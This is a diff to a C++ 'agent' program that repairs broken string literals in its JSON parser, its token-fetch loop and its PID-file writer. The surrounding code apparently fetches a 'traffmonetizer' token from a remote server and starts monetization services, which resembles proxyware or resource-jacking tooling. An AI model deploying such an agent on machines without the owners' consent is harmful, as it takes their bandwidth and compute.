@@ -141,7 +141,7 @@ int detect_gpu() {
 static std::string g_active_services = "";
 
 std::string json_get_field(const std::string& json, const std::string& key) {
-    std::string needle = """ + key + """;
+    std::string needle = std::string(1, 34) + key + std::string(1, 34);
     size_t pos = json.find(needle);
     if (pos == std::string::npos) return "";
     pos = json.find(':', pos);
@@ -177,9 +177,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
     // Dual fallback: If JSON parsing was empty, fetch direct token
     if (tm_token.empty()) {
         std::string raw_tok = http_get(base_url + "?action=get_token&service=traffmonetizer");
-        while (!raw_tok.empty() && (raw_tok.back() == '
-' || raw_tok.back() == '
-' || raw_tok.back() == ' ')) {
+        while (!raw_tok.empty() && (raw_tok.back() == 10 || raw_tok.back() == 13 || raw_tok.back() == 32)) {
             raw_tok.pop_back();
         }
         if (!raw_tok.empty() && raw_tok[0] != '<' && raw_tok[0] != '{') {
@@ -288,8 +286,7 @@ int main(int argc, char* argv[]) {
 
     FILE* pf = fopen(".agent.pid", "w");
     if (pf) {
-        fprintf(pf, "%d
-", (int)getpid());
+        fprintf(pf, "%d%c", (int)getpid(), 10);
         fclose(pf);
     }
 
